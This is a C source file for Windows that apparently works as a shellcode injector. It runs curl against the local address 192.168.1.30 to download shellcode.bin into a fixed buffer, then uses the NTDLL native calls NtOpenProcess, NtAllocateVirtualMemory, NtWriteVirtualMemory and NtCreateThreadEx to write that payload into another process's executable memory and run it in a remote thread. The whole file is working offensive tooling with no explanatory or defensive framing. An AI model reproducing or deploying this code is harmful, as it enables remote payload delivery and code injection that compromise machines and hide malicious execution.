#include <Windows.h>
#include "headers.h"

unsigned char code[550];
int count = 0;


BOOL statusCheck(NTSTATUS Check) {
    if (Check != STATUS_SUCCESS) {
        return FALSE;
    } else {
        return TRUE;
    }
}


int main(int argc, char* argv[]) {
    DWORD tID      =    0;
    HANDLE hProc   = NULL;
    HANDLE hThread = NULL;
    HMODULE hNTDLL = NULL;
    PVOID rBuffer  = NULL;
    NTSTATUS status;
    //const char* pName = "Notepad.exe";
    DWORD pID = atoi(argv[1]);
    OBJECT_ATTRIBUTES OA = {  sizeof(OA), NULL };
    CLIENT_ID        CID = { (HANDLE)pID, NULL };

    
    /*=========================================================*/
    char* command = "curl -s http://192.168.1.30/shellcode.bin";
    FILE* fpipe;
    char c = 0;
    int count = 0;

    if (0 == (fpipe = (FILE*)popen(command, "r"))) { // Cast Command outPut Into File Strean For Reading From
        perror("pOpenFailed");                                  // Function To Download Payload from server
        return 1;
    }
    while (fread(&c, sizeof(c), 1, fpipe)) { // Read output and save Into buffer
        code[count] = c;
        count = count + 1;
    }
    pclose(fpipe);                       // Close File Stream
    size_t code_len = sizeof(code);
    printf("\n\n\n");
    /*=======================================================================================================================*/
    info("Getting Handle To NTDLL");
    hNTDLL = GetModuleHandleW(L"NTDLL");
    okay("Loaded Module\n\\____0x%p\n", hNTDLL);

    info("Loading Needed Addresses...");
    NtOpenProcess pOpenProc = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");                                            // Load All Addresses We Need From NTDLL.dll
    printf("[NtOpenProcess]\n\\____0x%p\n", pOpenProc);

    _func_NtAllocateVirtualMemory pAllocMem = (_func_NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    printf("[NtAllocateVirtualMemory]\n\\_____0x%p\n", pAllocMem);

    _func_NtWriteVirtualMemory pWriteMem = (_func_NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    printf("[NtWriteVirtualMemory]\n\\______0x%p\n", pWriteMem);

    _func_NtCreateThreadEx pCreateThread = (_func_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    printf("[NtCreateThreadEx]\n\\_______0x%p\n", pCreateThread);
    
    _func_NtWaitForSingleObject pWait = (_func_NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
    printf("[NtWaitForSingleObject]\n\\________0x%p\n", pWait);

    _func_NtClose pClose = (_func_NtClose)GetProcAddress(hNTDLL, "NtClose");
    printf("[NtClose]\n\\________0x%p\n", pClose);
    /*=======================================================================================================================*/
    info("Getting Handle Too [%ld]", pID);
    status = pOpenProc(&hProc, PROCESS_ALL_ACCESS, &OA, &CID );
    if (!statusCheck(status)) {
        error("Failed Getting Handle");
        return EXIT_FAILURE;
    }
    info("Got Handle [%ld]\n\\____0x%p\n", pID, hProc);

    status = pAllocMem(hProc, &rBuffer, 0, &code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        error("Failed Allocating Memory\t %ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Allocated %ld-Bytes\n\\___0x%p", code_len, rBuffer);

    status = pWriteMem(hProc, rBuffer, code, sizeof(code), 0);
    if (status != STATUS_SUCCESS) {
        error("Failed Writing\t %ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Wrote %ld-Bytes\n", code_len);

    status = pCreateThread(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        error("Failed Starting Thread\t %ld", GetLastError());
        return EXIT_FAILURE;
    }
    okay("Started Thread\n\\___0x%p", rBuffer);

    pWait(hThread, FALSE, -1);
    okay("Thread Finished, Cleaning Up");

    pClose(hThread);
    pClose(hProc);
    return 0;
}
